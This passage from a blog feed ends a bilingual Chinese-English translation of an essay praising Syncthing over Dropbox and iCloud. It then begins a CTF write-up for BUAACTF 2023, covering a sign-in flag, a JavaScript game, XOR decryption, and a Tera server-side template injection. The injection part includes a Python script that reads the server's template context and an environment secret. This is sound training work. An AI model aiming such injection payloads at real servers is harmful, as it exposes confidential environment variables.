&lt;li&gt;在无头 Linux 服务器上安装 Synthing；&lt;/li&gt;
&lt;li&gt;Control it by editing XML config,&lt;/li&gt;
&lt;li&gt;通过编辑 XML 配置来控制它；&lt;/li&gt;
&lt;li&gt;Control it via REST API,&lt;/li&gt;
&lt;li&gt;通过 REST API 来控制它；&lt;/li&gt;
&lt;li&gt;Configure folder ignores via regular expressions.&lt;/li&gt;
&lt;li&gt;通过正则表达式来配置要忽略的文件。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;All APIs and configs are well-documented:&lt;/p&gt;
&lt;p&gt;所有的 API 和配置都有详细的文档：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/api.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;For example, this is my &lt;code&gt;.stignore&lt;/code&gt; for workspace folder:&lt;/p&gt;
&lt;p&gt;例如，这是我工作区文件夹的 &lt;code&gt;.stignore&lt;/code&gt;：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/stignore.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;Configure it once and forget about generated classes, vendor dependencies and other caches syncing unnecessary forever.&lt;/p&gt;
&lt;p&gt;配置一次，然后就可以忘记生成的类、vendor 的依赖和其他缓存，它们永远不会同步。&lt;/p&gt;
&lt;p&gt;In contrast, iCloud has a feature to exclude &lt;code&gt;*.nosync&lt;/code&gt; files from syncing, but you know what? I usually don’t have files called &lt;code&gt;*.nosync&lt;/code&gt;, that’s the problem:&lt;/p&gt;
&lt;p&gt;相比之下，iCloud 有一个功能可以排除 &lt;code&gt;*.nosync&lt;/code&gt; 文件的同步，但你知道吗，我通常没有叫做 &lt;code&gt;*.nosync&lt;/code&gt; 的文件，这就是问题所在：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/tonsky/venn.svg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;And Dropbox? Well… I still have nightmares about this Dropbox UI:&lt;/p&gt;
&lt;p&gt;那 Dropbox 呢？唔……我仍然对这个 Dropbox UI 梦魇般地记忆犹新：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_folders.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;It’s kind of funny, how commercial apps have feature bloat but don’t have power mode. You can do more different things, but can’t configure them to your liking.&lt;/p&gt;
&lt;p&gt;滑稽的是，商业应用程序有膨胀的功能，却没有高级模式。你可以做更多不同的事情，但不能按照你的喜好来配置它们。&lt;/p&gt;
&lt;p&gt;{/* ## No upsell */}&lt;/p&gt;
&lt;h2&gt;没有追加销售&lt;/h2&gt;
&lt;p&gt;Commercial solutions are interested in keeping users locked in and constantly upselling more features to them. As a result of that, you get notifications, features, popups. For example, on this screenshot, after I &lt;em&gt;just&lt;/em&gt; installed Dropbox on a fresh machine:&lt;/p&gt;
&lt;p&gt;商业解决方案只对让用户锁定并不断向他们推销更多功能感兴趣。因此，你会收到通知、特性和弹窗。例如，在这个截图中，我&lt;em&gt;刚刚&lt;/em&gt;在一台新机器上安装了 Dropbox 后：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_12.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;Top to bottom:&lt;/p&gt;
&lt;p&gt;从上到下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;I already have an annoying red dot in the menubar,&lt;/li&gt;
&lt;li&gt;菜单栏上已经有一个烦人的红点；&lt;/li&gt;
&lt;li&gt;Link to another product (Paper), even though it has nothing to do with file synchronization,&lt;/li&gt;
&lt;li&gt;另一个产品（Paper）的链接，即使它与文件同步无关；&lt;/li&gt;
&lt;li&gt;A firm suggestion I should enable notifications,&lt;/li&gt;
&lt;li&gt;一个坚定地认为我应该启用通知的建议；&lt;/li&gt;
&lt;li&gt;A notification that says my Desktop app is ready for use?! I mean, I’m looking at it from the desktop app!&lt;/li&gt;
&lt;li&gt;一个通知，说我的桌面应用已经准备好使用了？！我的意思是，我正在从桌面应用上看着它！&lt;/li&gt;
&lt;li&gt;Dropbox advertising some sort of trial,&lt;/li&gt;
&lt;li&gt;Dropbox 宣传某种试用期；&lt;/li&gt;
&lt;li&gt;Dropbox selling me more space (even though it was 2 years ago and I have&amp;gt;50% free),&lt;/li&gt;
&lt;li&gt;Dropbox 向我出售更多空间（即使是两年前，我有 &amp;gt;50% 的空闲空间）；&lt;/li&gt;
&lt;li&gt;Large “Upgrade” button,&lt;/li&gt;
&lt;li&gt;大大的「升级」按钮；&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In the mystic “For you” tab:&lt;/p&gt;
&lt;p&gt;在神秘的「For you」标签中：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_for_you.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;we see:&lt;/p&gt;
&lt;p&gt;我们看到：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Starred items? What is it, a high-school notepad? If I really wanted, I could tag files in the OS, but thank you.&lt;/li&gt;
&lt;li&gt;星标项目？这是什么，高中的笔记本？如果我真的想要，我可以在操作系统中标记文件，但谢谢你。&lt;/li&gt;
&lt;li&gt;Calendar sync? Why on Earth would FILE SYNCHRONIZATION application wants to access my calendar?&lt;/li&gt;
&lt;li&gt;日历同步？到底为什么一个&lt;em&gt;文件同步&lt;/em&gt;应用程序想要访问我的日历？&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Wait, there’s more:&lt;/p&gt;
&lt;p&gt;等等，还有更多：&lt;/p&gt;
&lt;p&gt;&amp;lt;a href=&amp;quot;https://tonsky.me/blog/syncthing/dropbox_settings.png&amp;quot;&amp;gt;&amp;lt;img src=&amp;quot;/tonsky/dropbox_settings.png&amp;quot; alt=&amp;quot;Dropbox &amp;gt; Preferences &amp;gt; Sync&amp;quot; /&amp;gt;&amp;lt;/a&amp;gt;&lt;/p&gt;
&lt;p&gt;More “features”:&lt;/p&gt;
&lt;p&gt;更多的「特性」：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Desktop sync,&lt;/li&gt;
&lt;li&gt;桌面同步；&lt;/li&gt;
&lt;li&gt;Photos sync,&lt;/li&gt;
&lt;li&gt;照片同步；&lt;/li&gt;
&lt;li&gt;Screenshots sync.&lt;/li&gt;
&lt;li&gt;截图同步。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These are at least file-like? I don’t understand why they have to be “special features”, though, if you already have an app whose primary task is to sync files. It already does that. Why are some files more special than others?&lt;/p&gt;
&lt;p&gt;这些至少是文件了？我不明白为什么它们必须是「专门的特性」。如果你已经有一个主要任务是同步文件的应用程序的话，它已经做到了。为什么有些文件比其他文件更特别呢？&lt;/p&gt;
&lt;p&gt;The answer is simple: the only way Dropbox can survive is by building and selling more features. You’ll never have peace of mind with them.&lt;/p&gt;
&lt;p&gt;答案很简单：Dropbox 生存的唯一方法是建立和销售更多的功能。你永远不会和他们一起安心。&lt;/p&gt;
&lt;p&gt;iCloud is much younger and doesn’t have feature bloat yet, but they are still interested in selling more Macs and iPhones. So they will always try to isolate you from the rest of the world. Expect weird restrictions and great inconveniences, like iCloud folder location or moving Desktop folder when you enable/disable sync for it.&lt;/p&gt;
&lt;p&gt;iCloud 还很年轻，还没有膨胀的功能，但他们仍然想销售更多的 Mac 和 iPhone。所以他们总是试图将你与世界其他地方隔离开来。准备好遇到奇怪的限制和巨大的不便，比如 iCloud 文件夹位置，或在启用/禁用它的同步时移动桌面文件夹。&lt;/p&gt;
&lt;p&gt;Syncthing survival, on the other hand, does not depend on making more features. They do one thing, but they do it well. Look, their menu looks exactly how Dropbox used to look when it still was good in 2012:&lt;/p&gt;
&lt;p&gt;另一方面，Syncthing 的生存并不依赖于制作更多的功能。他们只做一件事，但他们做得很好。看，他们的菜单[^1]看起来就像 Dropbox 在 2012 年还很好的时候一样：&lt;/p&gt;
&lt;p&gt;[^1]: 如果你选择安装 &lt;a href=&quot;https://github.com/syncthing/syncthing-macos&quot;&gt;macOS app&lt;/a&gt; 的话。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/menubar.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;{/* ## No lock-in */}&lt;/p&gt;
&lt;h2&gt;不会绑架用户&lt;/h2&gt;
&lt;p&gt;Another ugly thing both iCloud and Dropbox routinely do is trying to scare you from walking away. Those appear every time you move more than one file outside of iCloud folder:&lt;/p&gt;
&lt;p&gt;另一个 iCloud 和 Dropbox 经常做的丑陋的事情是试图吓唬你来阻止你离开。每当你将多个文件移出 iCloud 文件夹时，它们就会出现：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/icloud_scare_1.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/icloud_scare_2.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;And those are Dropbox versions:&lt;/p&gt;
&lt;p&gt;而这些是 Dropbox 的版本：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_scare_1.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/dropbox_scare_2.png&quot; alt=&quot; &quot;&gt;&lt;/p&gt;
&lt;p&gt;It might seem like they try to explain something, but they do not. They are scared you might be leaving and try to scare you back. The tactic is simple: question your every action, even trivial operations like moving or deleting files, display huge warning signs even for safe operations, long puzzling wording (“&lt;a href=&quot;https://grumpy.website/post/0Ts_fkPQb&quot;&gt;documents stored in iCloud will be removed from Mac&lt;/a&gt;”) so that you never sure what will happen. That’s some shady shit.&lt;/p&gt;
&lt;p&gt;看上去它们在尝试解释什么，但实际上没有。它们害怕你可能会离开，所以试图通过让你害怕而使你回头。他们的战术很简单：质疑你的每一个行动，甚至是像移动或删除文件这样的琐碎操作；对于安全的操作也展示巨大的警告标志；使用长篇累牍且令人困惑的文字（「&lt;a href=&quot;https://grumpy.website/post/0Ts_fkPQb&quot;&gt;存储在 iCloud 中的文档将从 Mac 中删除」&lt;/a&gt;）——进而使你永远不确定会发生什么。简直猥琐。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://web.archive.org/web/20200611194003/https://twitter.com/nikitonsky/status/1271116871711023104&quot;&gt;&lt;img src=&quot;https://tonsky.me/blog/syncthing/scared.png&quot; alt=&quot;「iCloud的提示让我非常害怕，以至于我避免与它们进行任何操作。不太明白我的文件会发生什么。」&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Syncthing, on the other hand, simply doesn’t care. They don’t get any money from you, so they are not interested in creating a need or constantly reminding about themselves. If you are looking for peace of mind, you can’t have it with commercial offerings.&lt;/p&gt;
&lt;p&gt;另一方面，Syncthing 根本不关心这些。它们不从你身上获得任何金钱，所以对于创造需求或者不断提醒你它们自身并不感兴趣。如果你正在寻求内心的宁静，商业产品无法提供这种体验。&lt;/p&gt;
&lt;p&gt;{/* ## Conclusion */}&lt;/p&gt;
&lt;h2&gt;结论&lt;/h2&gt;
&lt;p&gt;Syncthing has reminded me how great computers can be if they are not made by corporations. It’s simple, predictable, sane, acts no-nonsense. You can configure it however you like and it always keeps you in control. It’s a pure function and it’s good at that. It’s free and open-source, but I’m much more happy to donate them €10/month than e.g. Dropbox. I would be a much happier person if at least half of the programs on my Mac/iPhone were like that.&lt;/p&gt;
&lt;p&gt;Syncthing 让我想起，如果电脑不是由大公司制造的，它们能有多棒。它简单、可预见、理智，不拖泥带水。你可以按照自己的喜好来配置它，而且始终由你控制。它是一个纯粹的程序，而且做得非常好。它开源免费，但比起 Dropbox 这种货色，我更愿意向他们捐赠 €10/月。如果我 Mac/iPhone 上的程序至少有一半是这样的，那么我会是一个更快乐的人。&lt;/p&gt;
&lt;p&gt;&amp;lt;div class=&amp;quot;footer&amp;quot;&amp;gt;
2020 年 6 月 15 日 · 在
&lt;a href=&quot;https://news.ycombinator.com/item?id=23537243&quot;&gt;HackerNews&lt;/a&gt; 上讨论 · &lt;a href=&quot;https://news.ycombinator.com/item?id=29837696&quot;&gt;另一条
HackerNews&lt;/a&gt; · 翻译于 2023 年 7
月
&amp;lt;/div&amp;gt;&lt;/p&gt;
</content:encoded></item><item><title>第三届「蓝天杯」网络安全技能大赛 Writeup</title><link>https://blog.xinshijiededa.men/writeup/buaactf-2023/</link><guid isPermaLink="true">https://blog.xinshijiededa.men/writeup/buaactf-2023/</guid><description>第一次打 CTF，看到 flag 的时候又想起几年前第一次写 Python 时在 Jupyter Notebook 中爬虫成功运行时的心态，真是久违的热情🥲</description><pubDate>Wed, 12 Jul 2023 12:25:00 GMT</pubDate><content:encoded>&lt;p&gt;{/* this article is moved to &lt;code&gt;mdx&lt;/code&gt; because &lt;code&gt;md&lt;/code&gt; somehow does not support imported images (???). Don&apos;t know if it is Astro&apos;s fault. */}&lt;/p&gt;
&lt;p&gt;第一次打 CTF，看到 flag 的时候又想起几年前第一次写 Python 时在 Jupyter Notebook 中爬虫成功运行时的心态，真是久违的热情🥲&lt;/p&gt;
&lt;p&gt;不过其实只算做出来了两道题，其他的都是签到题🙃&lt;/p&gt;
&lt;h2&gt;签到&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;53 pts&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;欢迎来到第三届“蓝天杯”网络安全技能大赛！&lt;/p&gt;
&lt;p&gt;关注赛博安全协会官方博客&lt;a href=&quot;https://or4ngesec.github.io/&quot;&gt;https://or4ngesec.github.io/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;第一个flag就在其中^_^&lt;/p&gt;
&lt;p&gt;Hacking for fun, good luck for youuuuuuuuuu!&lt;/p&gt;
&lt;p&gt;flag格式: &lt;code&gt;BUAACTF{*}&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;解答&lt;/h3&gt;
&lt;p&gt;查看 &lt;a href=&quot;https://github.com/or4ngeSec/or4ngesec.github.io&quot;&gt;仓库&lt;/a&gt; &lt;a href=&quot;https://github.com/or4ngeSec/or4ngesec.github.io/commit/6e9bf5f026bfae02f93f579bd361fd41c6a08b55&quot;&gt;历史&lt;/a&gt; 即可找到 flag，发现 flag 在关于页面，有 4 处。&lt;/p&gt;
&lt;h3&gt;截图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./%E7%AD%BE%E5%88%B0.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Flag&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;BUAACTF{W3lc0m3_t0_BUAACTF2023_3NjoY_l-l@ck1ng!}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Mota&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;72 pts&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;欢迎来到前端的世界！play&amp;amp;hack for fun!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://123.57.4.116:24268/&quot;&gt;http://123.57.4.116:24268/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;author:hiddener&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;解答&lt;/h3&gt;
&lt;p&gt;在 events.js 中用 &amp;lt;kbd&amp;gt;Ctrl&amp;lt;/kbd&amp;gt; + &amp;lt;kbd&amp;gt;F&amp;lt;/kbd&amp;gt; 搜索 &lt;code&gt;段&lt;/code&gt; 可以找到分成 3 段的 flag。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./mota.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4&gt;1&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;case 51:
       useful= &amp;quot;BUAACTF{HT&amp;quot;;
       Message = [&amp;quot;[Npc=3,仙子]恭喜你找到了第一段芙拉隔,它的值为&amp;quot;,&amp;quot;[Npc=3,仙子]&amp;quot;+useful];
       Event.ShowMessageList(Message,function(){
          Event.RemoveEvent(&amp;quot;Npc&amp;quot;,1,9,7);
        });
    break;
&lt;/code&gt;&lt;/pre&gt;
&lt;h4&gt;2&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;case 52:
       text = &amp;quot;NV9tb3RhXzFz&amp;quot;
       useful = atob(text);
       Message = [&amp;quot;[Npc=3,仙子]哇!你拿下了第二段腐拉蛤,它是&amp;quot;,&amp;quot;[Npc=3,仙子]&amp;quot;+useful];
       Event.ShowMessageList(Message,function(){
          Event.RemoveEvent(&amp;quot;Npc&amp;quot;,0,0,5);
        });
    break;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;控制台执行可得&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./mota-2.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h4&gt;3&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;case 53:
       text = new Uint8Array([95, 115, 48, 95, 102, 117, 110, 33, 125]);
       useful = String.fromCharCode.apply(null, text);;
       Message = [&amp;quot;[Npc=3,仙子]奈斯!你找到了最后一段富菈哥,它的内容:&amp;quot;,&amp;quot;[Npc=3,仙子]&amp;quot;+useful];
       Event.ShowMessageList(Message,function(){
          Event.RemoveEvent(&amp;quot;Npc&amp;quot;,1,5,3);
        });
    break;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;控制台执行可得&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./mota-3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;截图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./mota-flag.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Flag&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;BUAACTF{HT5_mota_1s_s0_fun!}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;strong&gt;Block Cipher&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;75 pts&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Recall the experiments done in class!&lt;/p&gt;
&lt;p&gt;author:bangzhu&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;./block-cipher-task.py&quot;&gt;block-cipher-task.py&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;解答&lt;/h3&gt;
&lt;p&gt;用结果中的 &lt;code&gt;iv{:py}&lt;/code&gt; 和 &lt;code&gt;key{:py}&lt;/code&gt; 的替换掉 &lt;code&gt;encrypt{:py}&lt;/code&gt; 函数中的随机数。加密的过程很简单。首先是将 flag 分割成了 8 字符一段的 &lt;code&gt;parts{:py}&lt;/code&gt; 列表，然后对每一个 &lt;code&gt;part{:py}&lt;/code&gt; 执行 &lt;code&gt;reduce(xor, [part, iv if index == 0 else results[-1], key]){:py}&lt;/code&gt;——实际上对应的 result 就是 &lt;code&gt;part{:py}&lt;/code&gt;、上一个结果或 &lt;code&gt;iv{:py}&lt;/code&gt; 和 &lt;code&gt;key{:py}&lt;/code&gt; 的&lt;strong&gt;异或&lt;/strong&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import operator
import random
import re
from functools import reduce
# from secret import flag

def pad(s):
    padding_length = (8 - len(s)) % 8
    return s + chr(padding_length) * padding_length

def xor(a, b):
    assert len(a) == len(b)
    return bytes(map(operator.xor, a, b))

def encrypt(s):
    iv = b&apos;\xba=y\xa3\xc6)\xcf\xf7&apos; # bytes(random.randint(0, 255) for _ in range(8))
    key = b&apos;}6E\xeb(\x91\x08\xa0&apos; # bytes(random.randint(0, 255) for _ in range(8))
    parts = list(map(str.encode, map(pad, re.findall(r&apos;.{1,8}&apos;, s))))
    print(parts)
    results = []
    for index, part in enumerate(parts):
        print(index, part)
        results.append(reduce(xor, [part, iv if index == 0 else results[-1], key]))
    return iv, key, results

# xor(part, result[-1], key)
# xor(part, y) = result, y = xor(result, y)

iv, key, parts = encrypt(
    &amp;quot;BUAACTF{abcdefgh}&amp;quot;
)
print(f&amp;quot;iv = {iv}&amp;quot;)
print(f&amp;quot;key = {key}&amp;quot;)
print(f&amp;quot;parts = {parts}&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由&lt;strong&gt;异或&lt;/strong&gt;的性质，$D = A ⊕ B ⊕ C \Leftrightarrow A = D ⊕ B ⊕ C$，据此编码根据结果倒序还原，便可解出原 &lt;code&gt;parts{:py}&lt;/code&gt;。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;parts = [b&apos;\x85^}\t\xad\xec\x81,&apos;, b&apos;\xba\x04W\xa1\xee&amp;quot;\xea\xc5&apos;, b&apos;\xb7ZW\x18\x99\x82\xd6:&apos;, b&apos;\x99\x03}\x9c\xde|\xb1\xc5&apos;, b&apos;\xa1Tk.\x8b\xee\xbaf&apos;]
decrypted = &amp;quot;&amp;quot;
for i, value in reversed(list(enumerate(parts))):
    value = xor(value, key)
    prev = parts[i-1] if i &amp;gt; 0 else iv
    value = xor(value, prev)
    print(value)
    decrypted = value.decode() + decrypted
print(&amp;quot;Flag:&amp;quot;, decrypted)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;异或&lt;/strong&gt;的这个性质也被用于 RAID5：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;三块磁盘（两块数据，一个块校验盘）其实就是：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;c = a ^ b
a = c ^ b
b = a ^ c
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h3&gt;截图&lt;/h3&gt;
&lt;p&gt;&lt;img src=&quot;./cipher.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h3&gt;Flag&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;BUAACTF{BloCk_cIphER_14_Soooooo_EaSY}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;&lt;strong&gt;&lt;strong&gt;easy-ssti&lt;/strong&gt;&lt;/strong&gt;&lt;/h2&gt;
&lt;h3&gt;题目&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;非常只因础的SSTI，但不是flask。&lt;/p&gt;
&lt;p&gt;author:hiddener&lt;/p&gt;
&lt;p&gt;https://tera.netlify.app/docs/&lt;/p&gt;
&lt;p&gt;尝试获取当前上下文--&amp;gt;获取敏感环境变量，不需要RCE。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在输入框中直接输入的符号都会被用百分号 escape，故编码发送请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;./ssti.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;查阅文档，发现&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;There are 3 kinds of delimiters and those cannot be changed:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;{{&lt;/code&gt; and &lt;code&gt;}}&lt;/code&gt; for expressions&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{%&lt;/code&gt; and &lt;code&gt;%}&lt;/code&gt; for statements&lt;/li&gt;
&lt;li&gt;&lt;code&gt;{#&lt;/code&gt; and &lt;code&gt;#}&lt;/code&gt; for comments&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;但是，请求中的 &lt;code&gt;{{{:js}&lt;/code&gt; 和 &lt;code&gt;}}{:js}&lt;/code&gt; 被屏蔽了。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import requests
url = &amp;quot;http://10.212.25.14:49574/&amp;quot;
def fetch(data):
    body = &amp;quot;content=&amp;quot; + data
    headers = {&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;}
    r = requests.post(url, data=body, headers=headers)
    print(r.text.replace(&amp;quot;\\n&amp;quot;, &amp;quot;\n&amp;quot;).replace(&amp;quot;\\&amp;quot;, &apos;&apos;))
fetch(&amp;quot;{}&amp;quot;) # …&amp;lt;div class=&amp;quot;result&amp;quot;&amp;gt;您的身高为 {} cm&amp;lt;/div&amp;gt;…
fetch(&amp;quot;}}&amp;quot;) # forbbidden!
fetch(&amp;quot;{{&amp;quot;) # forbbidden!
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;故只能使用 &lt;code&gt;{%&lt;/code&gt; 和 &lt;code&gt;%}&lt;/code&gt; 嵌入流程控制语句。hint 中提示获取当前上下文，可知我们需要  &lt;code&gt;__tera_context{:rs}&lt;/code&gt;。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;A magical variable is available in every template if you want to print the current context: &lt;code&gt;__tera_context{:rs}&lt;/code&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;随意构造一个错误的语句，从返回的报错中可以发现使用了 &lt;code&gt;Tera::one_off{:rs}&lt;/code&gt; one off template。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;fetch(&amp;quot;{% println!(__tera_context) %}&amp;quot;)

Error while rendering: Error { kind: Msg(&amp;quot;Failed to parse &apos;__tera_one_off&apos;&amp;quot;), source: Some(Error { kind: Msg(&amp;quot;  --&amp;gt; 18:35
   |
18 |         &amp;lt;div class=&amp;quot;result&amp;quot;&amp;gt;您的身高为 {% println!(__tera_context) %} cm&amp;lt;/div&amp;gt;
   |                                   ^---
   |
   = unexpected tag; expected end of input or some content&amp;quot;), source: None })
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;与字符串相关的有 &lt;code&gt;filter{:rs}&lt;/code&gt;，但是并没有实际可以使用的，也没有函数可分割字符串。查阅文档发现 for 循环可以逐字符，不过比较坑的是 &lt;a href=&quot;https://tera.netlify.app/playground/&quot;&gt;Playground&lt;/a&gt; 的版本可能旧了，这个功能无法使用。&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-rust&quot;&gt;{% for letter in &amp;quot;hahahaha&amp;quot; %}
  {% if loop.index % 2 == 0%}
    &amp;lt;span style=&amp;quot;color:red&amp;quot;&amp;gt;{{ letter }}&amp;lt;/span&amp;gt;
  {% else %}
    &amp;lt;span style=&amp;quot;color:blue&amp;quot;&amp;gt;{{ letter }}&amp;lt;/span&amp;gt;
  {% endif %}
{% endfor %}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为 &lt;code&gt;println!{:rs}&lt;/code&gt; 没有导入，不像 Flask 中有 &lt;code&gt;print{:py}&lt;/code&gt; 可以用，不能直接输出变量的值。不过我们可以用一个有 128 个分支的 if 来输出所有 ASCII 字符。&lt;/p&gt;
&lt;p&gt;输出 &lt;code&gt;__tera_context{:rs}&lt;/code&gt; 后发现有一个环境变量 &lt;code&gt;se3ret{:sh}&lt;/code&gt;，故我们还要用 &lt;code&gt;set{:rs}&lt;/code&gt; 和 built-in 函数 &lt;code&gt;get_env{:rs}&lt;/code&gt; 将其储存在一个变量中才能在 context 中看见它。&lt;/p&gt;
&lt;p&gt;完整的代码如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-python&quot;&gt;import requests
url = &amp;quot;http://10.212.25.14:49452/&amp;quot;

def get_branch(i):
    char = chr(i)
    quoted_char = f&amp;quot;&amp;quot;&amp;quot;&apos;{char}&apos;&amp;quot;&amp;quot;&amp;quot; if char != &amp;quot;&apos;&amp;quot; else &apos;&apos;&apos;&amp;quot;&apos;&amp;quot;&apos;&apos;&apos;
    return &amp;quot;&amp;quot;&amp;quot;{%- elif char == &amp;quot;&amp;quot;&amp;quot; + quoted_char + &amp;quot;&amp;quot;&amp;quot; -%} &amp;quot;&amp;quot;&amp;quot; + char + &amp;quot; &amp;quot;

branches = map(get_branch, range(127))

data = &amp;quot;&amp;quot;&amp;quot;
{% set arr = [__tera_context] %}
{% set flag = get_env(name=&amp;quot;se3ret&amp;quot;) %}
{%- for char in __tera_context -%}
    {%- if char == &apos;a&apos; -%}
    a&amp;quot;&amp;quot;&amp;quot; + &amp;quot;\n&amp;quot;.join(branches) + &amp;quot;&amp;quot;&amp;quot;
    {%- else -%}
    &amp;lt;NOCHAR&amp;gt;
    {%- endif -%}
{% endfor %}
&amp;quot;&amp;quot;&amp;quot;

print(data)

body = &amp;quot;content=&amp;quot; + data
headers = {&apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;}
r = requests.post(url, data=body, headers=headers)

print(r.text.replace(&amp;quot;\\n&amp;quot;, &amp;quot;\n&amp;quot;).replace(&amp;quot;\\&amp;quot;, &apos;&apos;))
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;结果：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;language-html&quot;&gt;    &amp;lt;!doctype html&amp;gt;
    &amp;lt;html&amp;gt;
    &amp;lt;head&amp;gt;
        &amp;lt;meta charset=&amp;quot;UTF-8&amp;quot;&amp;gt;
